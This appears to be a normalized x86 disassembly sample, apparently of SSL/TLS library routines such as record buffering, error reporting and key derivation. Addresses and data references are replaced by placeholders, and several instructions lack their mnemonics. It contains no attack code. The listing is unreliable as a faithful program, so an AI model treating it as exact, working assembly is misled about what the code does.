lea edx [ esp + 0x38 ]
push ecx
push edx
call sub_1002bca0
mov ecx [ esp + 0x100 ]
lea eax [ esp + 0x34 ]
push eax
lea edx [ esp + 0x44 ]
push ecx
push edx
call sub_1002bcc0
lea eax [ esp + 0x4c ]
push eax
call sub_1002bd50
push esi
call sub_1002c960
add esp 0x2c
cmp eax 0xfeff
je r-xdata
mov edi [ esp + 0x18 ]
mov [ esp + 0x21 ] al
push 0x8
lea eax [ edi + 0x2 ]
mov ecx [ edi + 0x2 ]
mov [ esp + 0x26 ] ecx
lea ecx [ esp + 0x2c ]
mov dx [ eax + 0x4 ]
lea eax [ esp + 0x24 ]
push eax
push ecx
mov [ esp + 0x32 ] dx
call sub_1002bca0
add esp 0xc
jmp r-xdata
sub_1001bc60
mov eax 0x84
call sub_1001d0d0
mov eax [ r--data ]
mov edx [ r--data ]
mov ecx [ r--data ]
mov [ esp + 0x4 ] eax
mov al [ r--data ]
push ebx
mov [ esp + 0x14 ] al
mov eax [ esp + 0x8c ]
mov [ esp + 0x10 ] edx
push ebp
mov edx [ eax + 0x58 ]
push esi
push edi
mov [ esp + 0x18 ] ecx
lea esi [ edx + 0xb8 ]
mov ecx 0x8
lea edi [ esp + 0x21 ]
mov ebx [ eax + 0xd8 ]
[ edi ] [ esi ]
lea esi [ edx + 0x98 ]
mov ecx 0x8
lea edi [ esp + 0x41 ]
push 0x30
[ edi ] [ esi ]
mov ecx [ esp + 0xa8 ]
mov edi [ eax + 0xbc ]
mov eax ecx
and ecx 0x1
cdq
sub eax edx
add edi 0x14
mov esi eax
mov eax [ esp + 0xa4 ]
sar esi 0x1
mov ebp [ ebx + 0x90 ]
push edi
lea edx [ esi + eax ]
add esi ecx
lea ecx [ esp + 0x1c ]
push 0x4d
mov [ esp + 0x1c ] edx
mov edx [ ebx + 0x8c ]
push ecx
push esi
push eax
push edx
call sub_1001b1d0
mov edx [ esp + 0x2c ]
lea eax [ esp + 0x80 ]
push 0x30
push eax
lea ecx [ esp + 0x38 ]
push 0x4d
push ecx
push esi
push edx
push ebp
call sub_1001b1d0
lea ecx [ esp + 0x9c ]
add esp 0x38
mov eax edi
sub ecx edi
mov esi 0x30
mov dl [ ecx + eax ]
mov bl [ eax ]
xor bl dl
mov [ eax ] bl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x30
pop ebx
add esp 0x84
retn
sub_1001bd60
mov eax [ esp + 0x4 ]
cmp eax 0x64
ja r-xdata
or eax 0xffffffff
retn
xor ecx ecx
mov cl [ eax + lookup_table_1001be6c ]
jmp [ ecx * 4 + jump_table_1001be08 ]
xor eax eax
retn
mov eax 0xa
retn
mov eax 0x14
retn
mov eax 0x15
retn
mov eax 0x16
retn
mov eax 0x1e
retn
mov eax 0x28
retn
mov eax 0x2a
retn
mov eax 0x2b
retn
mov eax 0x2c
retn
mov eax 0x2d
retn
mov eax 0x2e
retn
mov eax 0x2f
retn
mov eax 0x30
retn
mov eax 0x31
retn
mov eax 0x32
retn
mov eax 0x33
retn
mov eax 0x3c
retn
mov eax 0x46
retn
mov eax 0x47
retn
mov eax 0x50
retn
mov eax 0x5a
retn
mov eax 0x64
retn
sub_1001bee0
push esi
push edi
mov edi [ esp + 0x10 ]
test edi edi
jne r-xdata
mov eax [ esp + 0xc ]
lea esi [ eax + 0x94 ]
push esi
call sub_10010f10
add esp 0x4
test eax eax
jne r-xdata
push 0x49
push r--data
push 0x43
jmp r-xdata
mov ecx [ esi ]
push edi
push ecx
call sub_1001c090
add esp 0x8
pop edi
pop esi
retn
push 0x4e
push r--data
push 0x41
push 0xc6
push 0x14
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
retn
sub_1001bf40
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x18 ]
push edi
push 0x0
call sub_10014430
mov ebp eax
add esp 0x8
test ebp ebp
jge r-xdata
mov esi [ esp + 0x14 ]
mov eax [ esi + ebp * 8 + 0x28 ]
lea ebx [ esi + ebp * 8 + 0x28 ]
test eax eax
je r-xdata
push 0xbd
push r--data
push 0xf7
push 0xc1
push 0x14
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ esi + ebp * 8 + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_10021790
push edi
push eax
mov [ esp + 0x24 ] eax
call sub_10023500
mov eax [ esp + 0x24 ]
push eax
call sub_10023940
add esp 0x10
call sub_1001df60
cmp [ edi ] 0x6
jne r-xdata
push 0xdb
push r--data
push 0xa
lea ecx [ edi + 0x8 ]
push 0x1
push ecx
call sub_1001f5f0
add esp 0x14
mov [ esi + ebp * 8 + 0x2c ] edi
mov [ esi ] ebx
mov [ esi + 0x4 ] 0x0
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
push eax
call sub_10023940
add esp 0x4
mov edx [ ebx ]
push edi
push edx
call sub_100217b0
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ edi + 0xc ]
push ecx
call sub_10029800
add esp 0x4
test al 0x1
jne r-xdata
mov eax [ ebx ]
push eax
call sub_10022870
add esp 0x4
mov [ ebx ] 0x0
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
sub_1001c030
push esi
push edi
mov edi [ esp + 0x10 ]
test edi edi
jne r-xdata
mov eax [ esp + 0xc ]
lea esi [ eax + 0x94 ]
push esi
call sub_10010f10
add esp 0x4
test eax eax
jne r-xdata
push 0x12d
push r--data
push 0x43
jmp r-xdata
mov ecx [ esi ]
push edi
push ecx
call sub_1001bf40
add esp 0x8
pop edi
pop esi
retn
push 0x132
push r--data
push 0x41
push 0xc9
push 0x14
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
retn
sub_1001c090
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push edi
push ebp
call sub_10021790
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
push ebx
push ebp
call sub_10014430
mov edi eax
add esp 0x8
test edi edi
jge r-xdata
push 0x192
push r--data
push 0x10c
push 0xbf
push 0x14
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop ebp
pop ebx
retn
push esi
mov esi [ esp + 0x14 ]
mov eax [ esi + edi * 8 + 0x2c ]
test eax eax
je r-xdata
push 0x199
push r--data
push 0xf7
push 0xbf
push 0x14
call sub_1001de60
push ebx
call sub_10023940
add esp 0x18
xor eax eax
pop edi
pop ebp
pop ebx
retn
push ebx
call sub_10023940
mov eax [ esi + edi * 8 + 0x28 ]
lea edi [ esi + edi * 8 + 0x28 ]
add esp 0x4
test eax eax
je r-xdata
push eax
push ebx
call sub_10023500
add esp 0x8
call sub_1001df60
mov eax [ esi + edi * 8 + 0x2c ]
cmp [ eax ] 0x6
jne r-xdata
push 0x1bd
push r--data
push 0x3
lea eax [ ebp + 0x10 ]
push 0x1
push eax
call sub_1001f5f0
add esp 0x14
mov [ edi ] ebp
mov [ esi ] edi
mov [ esi + 0x4 ] 0x0
pop esi
pop edi
pop ebp
mov eax 0x1
pop ebx
retn
push eax
call sub_10022870
add esp 0x4
mov ecx [ esi + edi * 8 + 0x2c ]
push ecx
push ebp
call sub_100217b0
add esp 0x8
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
push eax
call sub_10029800
add esp 0x4
test al 0x1
jne r-xdata
mov edx [ esi + edi * 8 + 0x2c ]
push edx
call sub_10023940
add esp 0x4
mov [ esi + edi * 8 + 0x2c ] 0x0
call sub_1001df60
sub_1001c1e0
mov eax 0x14
call sub_1001d0d0
push ebx
push ebp
mov ebp [ esp + 0x20 ]
push esi
push edi
xor ebx ebx
push ebx
call [ SetLastError@IAT ]
mov ecx [ esp + 0x30 ]
mov [ ebp + 0x18 ] 0x1
cmp ecx ebx
jle r-xdata
cmp [ ebp + 0x1c ] ebx
jne r-xdata
pop edi
pop esi
pop ebp
mov eax ecx
pop ebx
add esp 0x14
retn
mov eax [ ebp + 0x54 ]
cmp [ eax + 0x44 ] ebx
jne r-xdata
push ebp
call [ ebp + 0x20 ]
add esp 0x4
cmp eax ebx
jl r-xdata
mov edx [ ebp + 0x54 ]
mov eax [ edx + 0x44 ]
cmp ecx eax
jg r-xdata
mov eax [ ebp + 0x38 ]
mov edi 0xf0
cmp eax edi
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
je r-xdata
mov esi [ edx + 0x50 ]
mov edi [ esp + 0x2c ]
mov ecx eax
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
cmp [ esp + 0x34 ] ebx
jne r-xdata
mov eax ecx
cmp [ ebp + 0x38 ] 0xf1
jne r-xdata
mov eax [ ebp + 0x100 ]
push ebx
cmp eax ebx
push 0x8001
je r-xdata
push 0x8e
push r--data
push 0xe5
jmp r-xdata
mov ecx [ ebp + 0x54 ]
mov edi [ ecx + 0x44 ]
sub edi eax
mov [ ecx + 0x44 ] edi
mov ecx [ ebp + 0x54 ]
mov esi [ ecx + 0x50 ]
add esi eax
mov [ ecx + 0x50 ] esi
mov ecx [ ebp + 0x54 ]
cmp [ ecx + 0x44 ] ebx
jne r-xdata
push 0x12e
push r--data
push 0x7e
mov eax [ ebp + 0x54 ]
mov ecx [ eax + 0x40 ]
mov edx [ eax ]
lea eax [ ecx + edx + 0x2 ]
mov ecx [ ebp + 0x50 ]
cmp eax ecx
jle r-xdata
push 0x2
push ebp
call sub_1001c550
add esp 0x10
cmp eax ebx
jle r-xdata
push 0x5
push ebp
call sub_1001c550
add esp 0x10
cmp eax ebx
jle r-xdata
push 0xec
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
mov [ ebp + 0x38 ] 0xf0
pop esi
pop ebp
pop ebx
add esp 0x14
retn
mov eax [ ebp + 0x54 ]
mov esi [ ebp + 0x4c ]
mov [ ebp + 0x38 ] edi
add esi 0x2
cmp [ eax ] ebx
je r-xdata
sub eax ecx
push 0x1
push eax
push eax
push ebp
call sub_1001c550
add esp 0x10
cmp eax ebx
jle r-xdata
mov ecx [ ebp + 0x54 ]
mov eax [ ebp + 0x4c ]
mov [ ebp + 0x38 ] 0xf1
xor edx edx
mov [ ecx + 0x8 ] ebx
mov dh [ eax ]
mov ecx [ ebp + 0x54 ]
mov dl [ eax + 0x1 ]
mov [ ecx + 0x40 ] edx
mov cl [ eax ]
test cl 0x80
je r-xdata
mov eax [ ebp + 0x4c ]
mov [ ebp + 0x100 ] ebx
test [ eax ] 0x80
je r-xdata
mov [ eax + 0x3c ] ebx
xor ecx ecx
mov cl [ esi ]
inc esi
mov [ eax + 0x3c ] ecx
jmp r-xdata
mov ecx [ ebp + 0x54 ]
mov [ ecx ] 0x1
mov ecx [ ebp + 0x54 ]
mov edx [ ecx + 0x40 ]
and edx 0x3fff
mov [ ecx + 0x40 ] edx
mov dl [ eax ]
mov eax [ ebp + 0x54 ]
shr edx 0x6
and edx 0x1
mov [ eax + 0x8 ] edx
mov edx [ ebp + 0x54 ]
mov [ edx ] ebx
mov eax [ ebp + 0x54 ]
and [ eax + 0x40 ] 0x7fff
jmp r-xdata
push 0xbb
push r--data
push 0xaf
jmp r-xdata
mov al [ eax + 0x2 ]
cmp al 0x1
je r-xdata
mov eax [ ebp + 0x80 ]
push eax
call sub_1002b600
mov edi eax
add esp 0x4
cmp edi 0x14
jbe r-xdata
mov [ eax + 0x58 ] esi
mov edx [ ebp + 0x54 ]
xor edi edi
mov [ edx + 0x50 ] esi
mov eax [ ebp + 0x54 ]
cmp [ eax + 0x3c ] ebx
jne r-xdata
mov eax [ ebp + 0x54 ]
cmp [ eax + 0x4 ] ebx
je r-xdata
cmp al 0x4
jne r-xdata
mov ecx [ ebp + 0x54 ]
lea edx [ edi + esi ]
mov [ ecx + 0x58 ] esi
mov eax [ ebp + 0x54 ]
mov [ eax + 0x50 ] edx
mov eax [ ebp + 0x54 ]
mov ecx [ eax + 0x3c ]
mov edx [ eax + 0x40 ]
add ecx edi
cmp ecx edx
ja r-xdata
push r--data
push 0xfa
push r--data
call sub_1001f8d0
push 0xf3
push r--data
push 0x11b
jmp r-xdata
jmp r-xdata
jmp r-xdata
push 0xff
push r--data
push 0x11b
jmp r-xdata
mov edx [ eax + 0x40 ]
mov [ eax + 0x44 ] edx
mov esi [ ebp + 0x54 ]
cmp [ esi + 0x4 ] ebx
jne r-xdata
inc [ esi + 0xd0 ]
jmp r-xdata
cmp [ esi + 0x40 ] edi
jb r-xdata
push ebp
call sub_1000e7d0
add esp 0x4
test ah 0x30
je r-xdata
push ebx
push ebp
call sub_1001ce70
mov eax [ ebp + 0x54 ]
push ebx
mov esi [ eax + 0x44 ]
sub esi edi
mov [ eax + 0x44 ] esi
lea eax [ esp + 0x1c ]
push eax
push ebp
call sub_1001cec0
mov eax [ ebp + 0x54 ]
add esp 0x14
lea esi [ esp + 0x10 ]
mov ecx [ eax + 0x3c ]
mov edx [ eax + 0x44 ]
sub edx ecx
mov ecx edi
mov [ eax + 0x44 ] edx
mov edx [ ebp + 0x54 ]
xor eax eax
mov edi [ edx + 0x58 ]
[ esi ] [ edi ]
jne r-xdata
push 0x112
push r--data
push 0x71
jmp r-xdata
mov ecx [ ebp + 0x7c ]
mov esi edx
push ecx
call sub_1002b5c0
mov ecx eax
mov eax [ esi + 0x40 ]
xor edx edx
add esp 0x4
div ecx
test edx edx
jne r-xdata
sub_1001c550
mov eax [ esp + 0x8 ]
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
push edi
mov ecx [ ebx + 0x54 ]
mov ebp [ ecx + 0x28 ]
cmp ebp eax
jl r-xdata
mov edx [ ebx + 0x60 ]
test edx edx
jne r-xdata
mov edx [ esp + 0x20 ]
test edx edx
je r-xdata
mov esi [ esp + 0x1c ]
mov edx 0x8001
cmp esi edx
jbe r-xdata
mov [ esp + 0x1c ] eax
mov edx [ ecx + 0x30 ]
mov esi [ ecx + 0x2c ]
add edx esi
mov [ ebx + 0x50 ] eax
mov [ ebx + 0x4c ] edx
add [ ebx + 0x50 ] eax
jmp r-xdata
test ebp ebp
mov [ esp + 0x14 ] 0x0
jne r-xdata
mov [ esp + 0x1c ] edx
mov edx [ ecx + 0x28 ]
pop edi
sub edx eax
pop esi
mov [ ecx + 0x28 ] edx
mov ebx [ ebx + 0x54 ]
pop ebp
mov ecx [ ebx + 0x2c ]
add ecx eax
mov [ ebx + 0x2c ] ecx
pop ebx
retn
mov edx [ esp + 0x20 ]
test edx edx
je r-xdata
mov edx [ ebx + 0x50 ]
test edx edx
je r-xdata
mov edx [ ecx + 0x2c ]
test edx edx
je r-xdata
mov esi [ ebx + 0x4c ]
mov edi [ ecx + 0x30 ]
mov edx [ ebx + 0x50 ]
cmp esi edi
mov [ esp + 0x14 ] edx
je r-xdata
xor ebp ebp
jmp r-xdata
mov edx [ esp + 0x20 ]
test edx edx
jne r-xdata
mov edx [ ebx + 0x54 ]
mov [ edx + 0x28 ] 0x0
mov edi [ ecx + 0x30 ]
mov ecx ebp
lea esi [ edx + edi ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebx + 0x54 ]
mov [ ecx + 0x2c ] 0x0
mov ecx edx
add ecx ebp
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov ecx [ ebx + 0x54 ]
cmp ebp eax
mov edx [ ecx + 0x30 ]
mov [ ebx + 0x4c ] edx
jge r-xdata
jle r-xdata
mov esi [ SetLastError@IAT ]
mov edx [ ebx + 0x54 ]
xor ecx ecx
mov [ edx + 0x2c ] ecx
mov edx [ ebx + 0x54 ]
mov [ edx + 0x28 ] ecx
mov edx [ esp + 0x14 ]
mov ecx [ ebx + 0x54 ]
add edx eax
sub ebp eax
mov [ ecx + 0x2c ] edx
mov edx [ ebx + 0x54 ]
mov [ edx + 0x28 ] ebp
jmp r-xdata
push 0x17f
push r--data
push 0xd3
push 0x70
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
mov ecx [ esp + 0x1c ]
mov edx [ ebx + 0x54 ]
mov edi [ esp + 0x14 ]
sub ecx ebp
mov [ ebx + 0x18 ] 0x3
push ecx
mov ecx [ edx + 0x30 ]
add ecx ebp
add ecx edi
push ecx
push eax
call sub_10020930
add esp 0xc
test eax eax
jle r-xdata
pop edi
pop esi
mov [ ebx + 0x50 ] eax
mov [ ebx + 0x18 ] 0x1
pop ebp
pop ebx
retn
mov ecx [ ebx + 0x50 ]
pop edi
add ecx eax
pop esi
mov [ ebx + 0x50 ] ecx
mov [ ebx + 0x18 ] 0x1
pop ebp
pop ebx
retn
mov ecx [ esp + 0x20 ]
test ecx ecx
je r-xdata
mov ebx [ ebx + 0x54 ]
pop edi
pop esi
mov ecx [ ebx + 0x28 ]
add ecx ebp
pop ebp
mov [ ebx + 0x28 ] ecx
pop ebx
retn
add ebp eax
mov eax [ esp + 0x18 ]
cmp ebp eax
jge r-xdata
mov eax [ esp + 0x18 ]
cmp ebp eax
jmp r-xdata
push 0x0
call esi
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
sub_1001c710
mov eax 0xc
call sub_1001d0d0
push ebx
push ebp
mov ebp [ esp + 0x18 ]
push esi
push edi
push ebp
call sub_1000e7d0
add esp 0x4
test ah 0x30
je r-xdata
mov eax [ ebp + 0xd0 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
test eax eax
jne r-xdata
push 0x0
call [ SetLastError@IAT ]
mov eax [ esp + 0x28 ]
mov [ ebp + 0x18 ] 0x1
test eax eax
jle r-xdata
push ebp
call sub_10019a20
mov eax [ ebp + 0xd0 ]
add esp 0x4
test eax eax
je r-xdata
push ebp
call [ ebp + 0x20 ]
add esp 0x4
test eax eax
jl r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
mov ecx [ ebp + 0x54 ]
mov ebx [ ecx + 0x10 ]
mov [ ecx + 0x10 ] 0x0
sub eax ebx
mov [ esp + 0x18 ] ebx
mov edi eax
mov [ esp + 0x10 ] edi
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0xc
retn
jne r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
push edi
push ecx
push ebp
call sub_1001ca70
add esp 0xc
jmp r-xdata
push 0x1ac
push r--data
push 0xe5
push 0x7f
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
mov ecx [ ebp + 0x8c ]
push ecx
call sub_1002b600
add esp 0x4
mov [ esp + 0x28 ] eax
mov esi eax
xor esi esi
mov [ esp + 0x28 ] esi
jmp r-xdata
test eax eax
jle r-xdata
mov edx [ ebp + 0x7c ]
push edx
call sub_1002b5c0
lea ecx [ esi + edi ]
add esp 0x4
cmp ecx 0x3fff
mov ebx eax
jbe r-xdata
cmp edi 0x7fff
jbe r-xdata
mov eax [ ebp + 0x54 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov ecx [ ebp + 0x54 ]
pop edi
pop esi
pop ebp
mov [ ecx + 0x10 ] ebx
pop ebx
add esp 0xc
retn
cmp eax edi
je r-xdata
cmp ebx 0x1
ja r-xdata
mov edi [ ebp + 0x54 ]
mov eax [ edi + 0x8 ]
test eax eax
jne r-xdata
xor ebx ebx
mov [ eax ] ebx
jmp r-xdata
mov [ esp + 0x20 ] 0x7fff
add eax ebx
test [ ebp + 0xf8 ] 0x1
jne r-xdata
mov eax ecx
xor edx edx
div ebx
test edx edx
jne r-xdata
mov eax [ ebp + 0x54 ]
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
cmp ecx 0x7fff
jbe r-xdata
mov edx [ ebp + 0x54 ]
mov ecx [ esp + 0x20 ]
mov [ edx + 0x48 ] ecx
mov eax [ ebp + 0x54 ]
mov [ eax + 0x3c ] ebx
mov eax [ ebp + 0x54 ]
mov edx [ eax + 0x34 ]
add edx 0x3
mov [ eax + 0x58 ] edx
mov eax [ ebp + 0x54 ]
mov edx [ eax + 0x34 ]
lea edx [ edx + esi + 0x3 ]
mov esi [ esp + 0x14 ]
mov [ eax + 0x54 ] edx
mov eax [ ebp + 0x54 ]
mov edx ecx
mov edi [ eax + 0x54 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
test ebx ebx
[ edi ] [ esi ]
je r-xdata
sub edi eax
add ebx eax
mov [ esp + 0x10 ] edi
mov [ esp + 0x18 ] ebx
jmp r-xdata
sub ebx edx
xor ebx ebx
jmp r-xdata
mov [ eax ] 0x0
xor ebx ebx
jmp r-xdata
mov eax ecx
xor edx edx
div ebx
mov [ edi ] 0x0
sub ecx edx
sub ecx esi
xor ebx ebx
mov [ esp + 0x20 ] ecx
jmp r-xdata
mov ecx 0x7fff
mov esi [ esp + 0x20 ]
mov edx [ ebp + 0x54 ]
mov esi [ esp + 0x20 ]
mov ecx ebx
xor eax eax
mov edi [ edx + 0x54 ]
mov edx ecx
add edi esi
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
jmp r-xdata
mov eax [ esp + 0x24 ]
mov [ esp + 0x20 ] edi
lea ecx [ ebx + eax ]
mov eax [ ebp + 0x54 ]
mov [ esp + 0x14 ] ecx
mov edx [ eax + 0x20 ]
test edx edx
je r-xdata
xor ecx ecx
test ebx ebx
setne cl
mov [ eax ] ecx
mov [ eax ] 0x1
jmp r-xdata
mov eax [ ebp + 0x54 ]
mov ecx [ eax + 0x8 ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0x54 ]
mov edx [ eax + 0x48 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x54 ]
cmp [ ecx ] 0x0
mov eax [ ecx + 0x58 ]
je r-xdata
lea ecx [ ebx + esi ]
push 0x1
mov [ eax + 0x4c ] ecx
mov edx [ ebp + 0x54 ]
mov eax [ edx + 0x58 ]
push eax
push ebp
call sub_1001cec0
mov eax [ ebp + 0x54 ]
mov ecx [ esp + 0x34 ]
add ebx ecx
push 0x1
mov edi [ eax + 0x48 ]
push ebp
add edi ebx
mov [ eax + 0x48 ] edi
call sub_1001ce70
add esp 0x14
mov eax [ ebp + 0x54 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
jne r-xdata
mov ecx [ ecx + 0x48 ]
sub eax 0x2
shr ecx 0x8
or cl 0x80
mov [ eax ] cl
mov edx [ ebp + 0x54 ]
mov cl [ edx + 0x48 ]
mov [ eax + 0x1 ] cl
mov ecx [ ebp + 0x54 ]
mov edx [ ecx + 0x20 ]
add edx 0x2
mov ecx [ ecx + 0x48 ]
sub eax 0x3
shr ecx 0x8
and cl 0x3f
mov [ eax ] cl
mov edx [ ebp + 0x54 ]
mov edi [ edx + 0x8 ]
test edi edi
je r-xdata
mov ecx [ ebp + 0x54 ]
mov dl [ ecx + 0x48 ]
mov [ eax + 0x1 ] dl
mov ecx [ ebp + 0x54 ]
mov dl [ ecx + 0x3c ]
mov [ eax + 0x2 ] dl
mov ecx [ ebp + 0x54 ]
mov edx [ ecx + 0x20 ]
add edx 0x3
jmp r-xdata
or cl 0x40
mov [ eax ] cl
mov [ ecx + 0x20 ] edx
mov edx [ ebp + 0x54 ]
mov [ edx + 0x38 ] eax
mov eax [ ebp + 0x54 ]
mov ebx [ eax + 0xd4 ]
inc ebx
mov [ eax + 0xd4 ] ebx
mov ecx [ ebp + 0x54 ]
mov eax [ esp + 0x10 ]
mov [ ecx + 0x14 ] eax
mov edx [ ebp + 0x54 ]
mov ecx [ esp + 0x14 ]
push eax
mov [ edx + 0x18 ] ecx
mov edx [ ebp + 0x54 ]
push ecx
push ebp
mov [ edx + 0x24 ] esi
mov edx [ ebp + 0x54 ]
mov [ edx + 0x1c ] 0x0
call sub_1001ca70
mov ebx [ esp + 0x24 ]
mov edi [ esp + 0x1c ]
add esp 0xc
sub_1001ca70
push ebp
mov edx [ esp + 0x10 ]
push esi
mov esi [ esp + 0xc ]
push edi
mov eax [ esi + 0x54 ]
mov ecx [ eax + 0x14 ]
cmp ecx edx
jg r-xdata
push 0x1df
push r--data
push 0x7f
push 0xd4
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
mov edx [ eax + 0x18 ]
mov eax [ esp + 0x14 ]
cmp edx eax
je r-xdata
mov edi [ SetLastError@IAT ]
test [ esi + 0xf8 ] 0x2
je r-xdata
push 0x1ef
push r--data
push 0x104
push 0xd4
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
mov eax [ esi + 0x54 ]
mov [ esi + 0x18 ] 0x2
mov edx [ eax + 0x20 ]
mov ebp [ eax + 0x1c ]
push edx
mov edx [ eax + 0x38 ]
add edx ebp
push edx
push ecx
call sub_100209d0
add esp 0xc
jmp r-xdata
mov eax [ esi + 0x54 ]
pop edi
mov [ eax + 0x20 ] 0x0
mov ecx [ esi + 0x54 ]
mov [ esi + 0x18 ] 0x1
pop esi
mov eax [ ecx + 0x24 ]
pop ebp
retn
test eax eax
jle r-xdata
mov ecx [ esi + 0x54 ]
cmp eax [ ecx + 0x20 ]
je r-xdata
pop edi
pop esi
pop ebp
retn
mov ebp [ ecx + 0x1c ]
add ebp eax
mov [ ecx + 0x1c ] ebp
mov ecx [ esi + 0x54 ]
sub [ ecx + 0x20 ] eax
jmp r-xdata
push 0x0
call edi
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
sub_1001cb50
mov eax [ esp + 0xc ]
test eax eax
jl r-xdata
retn
push esi
mov esi [ esp + 0x8 ]
push edi
mov ecx [ esi + 0x44 ]
add ecx eax
mov eax ecx
mov [ esi + 0x44 ] ecx
cmp eax 0x3
jl r-xdata
pop edi
xor eax eax
pop esi
mov eax [ esi + 0x3c ]
mov edi [ eax + 0x4 ]
cmp [ edi ] 0x0
jne r-xdata
xor ecx ecx
mov ch [ edi + 0x1 ]
mov cl [ edi + 0x2 ]
lea eax [ ecx - 0x1 ]
cmp eax 0x5
ja r-xdata
mov eax 0xfd
jmp [ eax * 4 + jump_table_1001cbf0 ]
lea eax [ edi + 0x3 ]
push esi
push eax
push edi
call memmove
add esp 0xc
mov eax 0xcb
jmp r-xdata
mov eax 0xca
jmp r-xdata
mov eax 0xc9
jmp r-xdata
mov eax 0xcc
jmp r-xdata
mov edx [ esp + 0x10 ]
push 0x2a3
push r--data
push eax
push edx
push 0x14
call sub_1001de60
mov ecx [ esi + 0x44 ]
add esp 0x14
add ecx 0xfffffffd
mov [ esi + 0x44 ] ecx
mov esi ecx
test esi esi
jle r-xdata
sub_1001cc10
push esi
mov esi [ esp + 0x8 ]
mov ecx [ esi + 0x3c ]
mov eax [ esi + 0x44 ]
push eax
mov edx [ ecx + 0x4 ]
mov ecx [ esi + 0x48 ]
add edx ecx
push edx
push esi
call sub_1001c710
mov ecx [ esi + 0x44 ]
add esp 0xc
cmp eax ecx
jne r-xdata
test eax eax
jge r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov edx [ esi + 0x48 ]
sub ecx eax
add edx eax
mov [ esi + 0x44 ] ecx
mov [ esi + 0x48 ] edx
xor eax eax
pop esi
retn
or eax 0xffffffff
pop esi
retn
mov eax 0x1
pop esi
retn
mov edx [ esi + 0x68 ]
push edx
mov edx [ esi + 0x48 ]
add edx ecx
mov ecx [ esi + 0x3c ]
push esi
push edx
mov edx [ ecx + 0x4 ]
mov ecx [ esi ]
push edx
push 0x0
push ecx
push 0x1
call eax
add esp 0x1c
sub_1001cc80
mov eax 0xc
call sub_1001d0d0
push ebp
push esi
mov esi [ esp + 0x18 ]
lea eax [ esp + 0x8 ]
push 0x0
lea ecx [ esp + 0x1c ]
mov edx [ esi + 0xbc ]
push eax
push ecx
push edx
call sub_1000fce0
add esp 0x10
test eax eax
jne r-xdata
mov eax [ esp + 0x8 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x8c ] eax
mov eax [ esi + 0x7c ]
test eax eax
jne r-xdata
push 0x1
push esi
call sub_100199f0
push 0x4a
push r--data
push 0xce
push 0x7c
push 0x14
call sub_1001de60
add esp 0x1c
xor eax eax
pop esi
pop ebp
add esp 0xc
retn
mov eax [ esi + 0x7c ]
push eax
mov [ esp + 0x14 ] eax
call sub_1001d7d0
mov eax [ esi + 0x88 ]
add esp 0x4
test eax eax
jne r-xdata
push 0x53
push r--data
push 0x8c
call sub_1001d4c0
add esp 0xc
mov [ esi + 0x7c ] eax
test eax eax
je r-xdata
mov eax [ esi + 0x88 ]
push eax
mov [ esp + 0x10 ] eax
call sub_1001d7d0
mov eax [ esp + 0x1c ]
mov edx [ esi + 0x54 ]
add esp 0x4
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ebp ]
mov [ edx + 0x9c ] ecx
mov eax [ esi + 0x54 ]
cmp [ eax + 0x9c ] 0x30
jbe r-xdata
push 0x5d
push r--data
push 0x8c
call sub_1001d4c0
add esp 0xc
mov [ esi + 0x88 ] eax
test eax eax
jne r-xdata
push 0x73
push r--data
push 0x41
push 0x7c
push 0x14
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
pop ebp
add esp 0xc
retn
push esi
call sub_10019850
add esp 0x4
test eax eax
jg r-xdata
push r--data
push 0x65
push r--data
call sub_1001f8d0
mov ecx [ esp + 0x18 ]
cmp [ ecx + 0xc ] 0x8
jle r-xdata
pop esi
xor eax eax
pop ebp
add esp 0xc
retn
push ebx
push edi
mov edi [ esp + 0x24 ]
mov edx [ esi + 0xbc ]
mov eax [ esi + 0x54 ]
mov ebx edi
neg ebx
sbb ebx ebx
add edx 0x8
and ebx ebp
push edx
mov edx [ esp + 0x24 ]
